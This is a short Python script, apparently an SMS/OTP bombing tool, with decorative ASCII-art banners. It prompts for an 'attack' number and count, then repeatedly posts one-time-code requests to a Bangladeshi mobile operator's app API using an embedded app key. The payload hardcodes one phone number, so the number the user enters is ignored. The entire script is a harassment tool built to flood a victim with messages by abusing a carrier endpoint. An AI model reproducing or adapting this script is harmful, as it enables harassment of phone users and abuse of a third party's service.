

# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White
print(bired+"""
╭━━━┳╮╱╱╭╮╭━━━━╮╱╭━╮╭━╮
┃╭━╮┃╰╮╭╯┃┃╭╮╭╮┃╱┃┃╰╯┃┃
┃╰━━╋╮╰╯╭┻┻┫┃┃┣┻━┫╭╮╭╮┃
╰━━╮┃╰╮╭┫━━┫┃┃┃┃━┫┃┃┃┃┃
┃╰━╯┃╱┃┃┣━━┃┃┃┃┃━┫┃┃┃┃┃
╰━━━╯╱╰╯╰━━╯╰╯╰━━┻╯╰╯╰╯""")
print(bicyan+"""
╭━╮╭━╮╱╱╭╮╱╱╱╱╱╭━━╮
┃┃╰╯┃┃╱╱┃┃╱╱╱╱╱┃╭╮┃
┃╭╮╭╮┣━━┫┃╭┳━━╮┃╰╯╰┳╮╱╭╮
┃┃┃┃┃┃╭╮┃╰╯┫┃━┫┃╭━╮┃┃╱┃┃
┃┃┃┃┃┃╭╮┃╭╮┫┃━┫┃╰━╯┃╰━╯┃
╰╯╰╯╰┻╯╰┻╯╰┻━━╯╰━━━┻━╮╭╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯""")

print(bipurple+"""
╭━━━╮╱╱╱╭╮╱╭╮╱╱╭━━━╮
┃╭━╮┃╱╱╱┃┃╱┃┃╱╱╰╮╭╮┃
┃╰━╯┣┳━━┫╰━╯┣━━╮┃┃┃┃
┃╭╮╭╋┫━━┫╭━╮┃╭╮┃┃┃┃┃
┃┃┃╰┫┣━━┃┃╱┃┃╭╮┣╯╰╯┃
╰╯╰━┻┻━━┻╯╱╰┻╯╰┻━━━╯""")
print(bigreen+"""
╱╱╭━┳━━━╮╱╱╱╱╱╭╮╱╱╱╱╱╱╭━━━╮╱╭━╮╱╭┳━╮
╱╭╯╭┫╭━╮┃╱╱╱╱╱┃┃╱╱╱╱╱╱┃╭━╮┃╱┃┃╰╮┃┣╮╰╮
╭╯╭╯┃┃╱╰╋┳━┳━━┫┃╱╱╭━━╮┃╰━╯┣┳┫╭╮╰╯┃╰╮╰╮
┃┃┃╱┃┃╱╭╋┫╭┫╭━┫┃╱╭┫┃━┫┃╭━━╋╋┫┃╰╮┃┃╱┃┃┃
┃┃┃╱┃╰━╯┃┃┃┃╰━┫╰━╯┃┃━┫┃┃╱╱┃┃┃┃╱┃┃┃╱┃┃┃
╰╮╰╮╰━━━┻┻╯╰━━┻━━━┻━━╯╰╯╱╱╰┻┻╯╱╰━╯╭╯╭╯
╱╰╮╰╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╭╯
╱╱╰━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━╯""")

import requests
from requests.structures import CaseInsensitiveDict
print("\n")
number=str(input("RisHaD Sir ApNaR AttaCK Numbr DiN: "))
amount=int(input("RisHaD SiR ApNaR AttaCK PoriMaN Likhun: "))
url = "https://circle.robi.com.bd/mylife/appapi/appcall.php"

headers = CaseInsensitiveDict()
headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
headers["User-Agent"] = "gzip"
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "op=getOTC&pin=21799&app_version=78&msisdn=8801641730090"

for i in range(amount):
	resp = requests.post(url, headers=headers, data=data)
	print(str([i])+"\t Cyber RS AttacK by RisHaD")


